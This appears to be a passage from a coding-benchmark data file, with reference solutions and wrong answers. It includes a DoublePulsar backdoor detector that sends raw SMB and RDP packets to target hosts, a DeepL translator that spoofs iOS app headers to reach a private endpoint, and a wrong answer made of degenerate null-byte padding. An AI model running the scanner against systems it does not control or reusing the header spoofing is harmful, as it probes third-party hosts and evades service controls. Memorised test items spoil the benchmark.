    if error:\n            self.destroy()\n            return\n        ip = result[0]\n        if ip in self._forbidden_iplist:\n            self.destroy()\n            return\n        self._chosen_server = self._get_a_server()\n        if self._chosen_server:\n            self._remote_address = (ip, self._chosen_server.port)\n            self._remote_sock = self._create_remote_socket(ip, self._chosen_server.port)\n            self._fd_to_handlers[self._remote_sock.fileno()] = self\n            self._loop.add(self._remote_sock, self._loop.READ, self._on_remote_read)\n            self._loop.add(self._remote_sock, self._loop.WRITE, self._on_remote_write)\n            self._update_stream(self._remote_sock, 1)\n            self._update_stream(self._local_sock, 1)\n            self._update_activity()\n        else:\n            self.destroy()\n\n    def _update_stream(self, stream, status):\n        if status == 1:\n            self._loop.modify(stream, self._loop.READ | self._loop.WRITE)\n        elif status == 0:\n            self._loop.modify(stream, self._loop.READ)\n        elif status == -1:\n            self._loop.modify(stream, self._loop.WRITE)\n        else:\n            self._loop.modify(stream, 0)\n\n    def _on_local_read(self):\n        data = self._local_sock.recv(65536)\n        if not data:\n            self.destroy()\n            return\n        self._update_activity()\n        self._data_to_write_to_remote.append(data)\n\n    def _on_remote_read(self):\n        data = self._remote_sock.recv(65536)\n        if not data:\n            self.destroy()\n            return\n        self._update_activity()\n        self._data_to_write_to_local.append(data)\n\n    def _on_local_write(self):\n        if not self._data_to_write_to_remote:\n            self._update_stream(self._local_sock, 0)\n            return\n        data = self._data_to_write_to_remote.pop(0)\n        self._write_to_sock(data, self._remote_sock)\n        self._update_stream(self._local_sock, -1)\n\n    def _on_remote_write(self):\n        if not self._data_to_write_to_local:\n            self._update_stream(self._remote_sock, 0)\n            return\n        data = self._data_to_write_to_local.pop(0)\n        self._write_to_sock(data, self._local_sock)\n        self._update_stream(self._remote_sock, -1)\n```\n"
  },
  {
    "Task_id": 319,
    "Instruction": "Task Description: Implement a class to detect the presence of DoublePulsar implants in SMB and RDP services on a target IP address using TCP socket communication.\n\nClass Description: The DoublePulsar class provides functionality to check for the presence of DoublePulsar backdoor implants in SMB (port 445) and RDP (port 3389) services. It handles protocol-specific packet crafting, socket communication, and response analysis.\n\nAttributes:\n- ip: str - Target IP address to scan (default: \"127.0.0.1\")\n- timeout: float - Socket timeout in seconds (default: None)\n- verbose: bool - Flag for verbose output (default: False)\n- ssl_negotiation_request: bytes - Predefined RDP SSL negotiation packet\n- non_ssl_negotiation_request: bytes - Predefined RDP non-SSL negotiation packet\n- non_ssl_client_data: bytes - Predefined RDP non-SSL client data packet\n- ssl_client_data: bytes - Predefined RDP SSL client data packet\n- ping_packet: bytes - Predefined RDP ping packet\n- negotiate_protocol_request: bytes - Predefined SMB negotiation packet\n- session_setup_request: bytes - Predefined SMB session setup packet\n- tree_connect_request: bytes - Predefined SMB tree connect packet\n- trans2_session_setup: bytes - Predefined SMB trans2 session setup packet\n\nMethods:\n- check_ip_smb() -> tuple[bool, str] - Checks for DoublePulsar implant via SMB protocol\n  Returns tuple containing detection status and message\n- check_ip_rdp() -> tuple[bool, str] - Checks for DoublePulsar implant via RDP protocol\n  Returns tuple containing detection status and message\n- _calculate_doublepulsar_xor_key(s: int) -> int - Internal method to calculate XOR key from signature\n  Takes signature value as input, returns calculated key",
    "Canonical_solution": "import socket\nimport ssl\nimport struct\nimport binascii\n\nclass DoublePulsar:\n    def __init__(self, ip=\"127.0.0.1\", timeout=None, verbose=False):\n        self.ip = ip\n        self.timeout = timeout\n        self.verbose = verbose\n\n        # RDP Packets\n        self.ssl_negotiation_request = binascii.unhexlify(\"030000130ee000000000000100080001000000\")\n        self.non_ssl_negotiation_request = binascii.unhexlify(\"030000130ee000000000000100080000000000\")\n        self.non_ssl_client_data = binascii.unhexlify(\"030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0\")\n        self.ssl_client_data = binascii.unhexlify(\"030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000100000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0\")\n        self.ping_packet = binascii.unhexlify(\"0300000e02f0803c443728190200\")\n\n        # SMB Packets\n        self.negotiate_protocol_request = binascii.unhexlify(\"00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200\")\n        self.session_setup_request = binascii.unhexlify(\"00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000\")\n        self.tree_connect_request = binascii.unhexlify(\"00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00\")\n        self.trans2_session_setup = binascii.unhexlify(\"0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000\")\n\n    def check_ip_smb(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(float(self.timeout) if self.timeout else None)\n        s.connect((self.ip, 445))\n\n        s.send(self.negotiate_protocol_request)\n        s.recv(1024)\n\n        s.send(self.session_setup_request)\n        session_setup_response = s.recv(1024)\n        user_id = session_setup_response[32:34]\n\n        modified_tree_connect_request = list(self.tree_connect_request)\n        modified_tree_connect_request[32] = user_id[0]\n        modified_tree_connect_request[33] = user_id[1]\n        modified_tree_connect_request = \"\".join(modified_tree_connect_request)\n\n        s.send(modified_tree_connect_request)\n        tree_connect_response = s.recv(1024)\n        tree_id = tree_connect_response[28:30]\n\n        modified_trans2_session_setup = list(self.trans2_session_setup)\n        modified_trans2_session_setup[28] = tree_id[0]\n        modified_trans2_session_setup[29] = tree_id[1]\n        modified_trans2_session_setup[32] = user_id[0]\n        modified_trans2_session_setup[33] = user_id[1]\n        modified_trans2_session_setup = \"\".join(modified_trans2_session_setup)\n\n        s.send(modified_trans2_session_setup)\n        final_response = s.recv(1024)\n        s.close()\n\n        if final_response[34] == \"\\x51\":\n            signature = final_response[18:26]\n            signature_long = struct.unpack('<Q', signature)[0]\n            key = self._calculate_doublepulsar_xor_key(signature_long)\n            return True, f\"DoublePulsar SMB implant detected XOR KEY: {hex(key)}\"\n        return False, \"No presence of DOUBLEPULSAR SMB implant\"\n\n    def check_ip_rdp(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(float(self.timeout) if self.timeout else None)\n        s.connect((self.ip, 3389))\n\n        s.send(self.ssl_negotiation_request)\n        negotiation_response = s.recv(1024)\n\n        if len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x02\" and negotiation_response[15] == \"\\x01\":\n            sock = ssl.wrap_socket(s)\n            s = sock\n            s.send(self.ssl_client_data)\n            s.recv(1024)\n        elif len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x03\" and negotiation_response[15] == \"\\x02\":\n            s.close()\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(float(self.timeout) if self.timeout else None)\n            s.connect((self.ip, 3389))\n            s.send(self.non_ssl_negotiation_request)\n            s.recv(1024)\n        elif len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x03\" and negotiation_response[15] == \"\\x05\":\n            s.close()\n            return False, \"Server requires NLA, which DOUBLEPULSAR does not support\"\n        else:\n            s.send(self.non_ssl_client_data)\n            s.recv(1024)\n\n        s.send(self.ping_packet)\n        try:\n            ping_response = s.recv(1024)\n            s.close()\n            if len(ping_response) == 288:\n                return True, \"DoublePulsar SMB implant detected\"\n            return False, f\"Status Unknown - Response received but length was {len(ping_response)} not 288\"\n        except socket.error:\n            return False, \"No presence of DOUBLEPULSAR RDP implant\"\n\n    def _calculate_doublepulsar_xor_key(self, s):\n        x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8))\n        return x & 0xffffffff",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport struct\n\nclass DoublePulsar:\n    def __init__(self, ip=\"127.0.0.1\", timeout=None, verbose=False):\n        self.ip = ip\n        self.timeout = timeout\n        self.verbose = verbose\n        self.ssl_negotiation_request = b\"\\x03\\x00\\x00\\x13\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x"
  },
  {
    "Task_id": 32,
    "Instruction": "Task Description: Implement a function to translate text using the DeepL API with HTTP client functionality, supporting multiple language translations and alternative translations.\n\nFunction Description: The function uses the httpx library to send HTTP POST requests to the DeepL API endpoint. It handles text translation between specified source and target languages, with options for requesting alternative translations and proxy support. The function includes error handling for HTTP status codes and processes the JSON response to extract translated text.\n\nInput:\n- text: (str) - The text to be translated\n- sourceLang: (str, optional) - Source language code (auto-detected if None)\n- targetLang: (str, optional) - Target language code (defaults to \"EN\")\n- numberAlternative: (int, optional) - Number of alternative translations to request (0-3)\n- printResult: (bool, optional) - Whether to print the translation result\n- proxies: (dict, optional) - Proxy configuration for the HTTP client\n\nOutput:\n- If numberAlternative <= 1: returns (str) - The translated text\n- If numberAlternative > 1: returns (list[str]) - List of alternative translations\n- Returns None if HTTP request fails (non-200 status)\n- Raises TooManyRequestsException on HTTP 429 status",
    "Canonical_solution": "import random\nimport time\nimport json\nimport httpx\nfrom langdetect import detect\n\ndeeplAPI = \"https://www2.deepl.com/jsonrpc\"\nheaders = {\n    \"Content-Type\": \"application/json\",\n    \"Accept\": \"*/*\",\n    \"x-app-os-name\": \"iOS\",\n    \"x-app-os-version\": \"16.3.0\",\n    \"Accept-Language\": \"en-US,en;q=0.9\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"x-app-device\": \"iPhone13,2\",\n    \"User-Agent\": \"DeepL-iOS/2.9.1 iOS 16.3.0 (iPhone13,2)\",\n    \"x-app-build\": \"510265\",\n    \"x-app-version\": \"2.9.1\",\n    \"Connection\": \"keep-alive\",\n}\n\ndef translate(\n    text,\n    sourceLang=None,\n    targetLang=None,\n    numberAlternative=0,\n    printResult=False,\n    proxies=None,\n):\n    iCount = getICount(text)\n    id = getRandomNumber()\n\n    if sourceLang is None:\n        sourceLang = detectLang(text)\n    if targetLang is None:\n        targetLang = \"EN\"\n\n    numberAlternative = max(min(3, numberAlternative), 0)\n\n    postData = {\n        \"jsonrpc\": \"2.0\",\n        \"method\": \"LMT_handle_texts\",\n        \"id\": id,\n        \"params\": {\n            \"texts\": [{\"text\": text, \"requestAlternatives\": numberAlternative}],\n            \"splitting\": \"newlines\",\n            \"lang\": {\n                \"source_lang_user_selected\": sourceLang,\n                \"target_lang\": targetLang,\n            },\n            \"timestamp\": getTimestamp(iCount),\n            \"commonJobParams\": {\n                \"wasSpoken\": False,\n                \"transcribe_as\": \"\",\n            },\n        },\n    }\n    postDataStr = json.dumps(postData, ensure_ascii=False)\n\n    if (id + 5) % 29 == 0 or (id + 3) % 13 == 0:\n        postDataStr = postDataStr.replace('\"method\":\"', '\"method\" : \"', -1)\n    else:\n        postDataStr = postDataStr.replace('\"method\":\"', '\"method\": \"', -1)\n\n    with httpx.Client(proxies=proxies) as client:\n        resp = client.post(url=deeplAPI, data=postDataStr, headers=headers)\n        respStatusCode = resp.status_code\n\n        if respStatusCode == 429:\n            raise TooManyRequestsException\n            return \n\n        if respStatusCode != 200:\n            print(\"Error\", respStatusCode)\n            return\n\n        respText = resp.text\n        respJson = json.loads(respText)\n\n        if numberAlternative <= 1:\n            targetText = respJson[\"result\"][\"texts\"][0][\"text\"]\n            if printResult:\n                print(targetText)\n            return targetText\n\n        targetTextArray = []\n        for item in respJson[\"result\"][\"texts\"][0][\"alternatives\"]:\n            targetTextArray.append(item[\"text\"])\n            if printResult:\n                print(item[\"text\"])\n\n        return targetTextArray",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport httpx\nimport json\n\nclass TooManyRequestsException(Exception):\n    pass\n\ndef translate(text, sourceLang=None, targetLang=\"EN\", numberAlternative=0, printResult=False, proxies=None):\n    url = \"https://api-free.deepl.com/v2/translate\"\n    auth_key = \"YOUR_API_KEY\"\n    params = {\n        \"auth_key\": auth_key,\n        \"text\": text,\n        \"target_lang\": targetLang,\n        \"split_sentences\": \"0\",\n        \"preserve_formatting\": \"0\",\n        \"tag_handling\": \"html\",\n        \"ignore_tags\": \"\",\n        \"formality\": \"\",\n        \"ignore_tags\": \"\",\n        \"tag_handling\": \"html\",\n        \"split_sentences\": \"0\",\n        \"preserve_formatting\": \"0\",\n        \"formality\": \"\",\n        \"only_private\": \"0\",\n        \"de\": \"\",\n        \"ru\": \"\",\n        \"fr\": \"\",\n        \"es\": 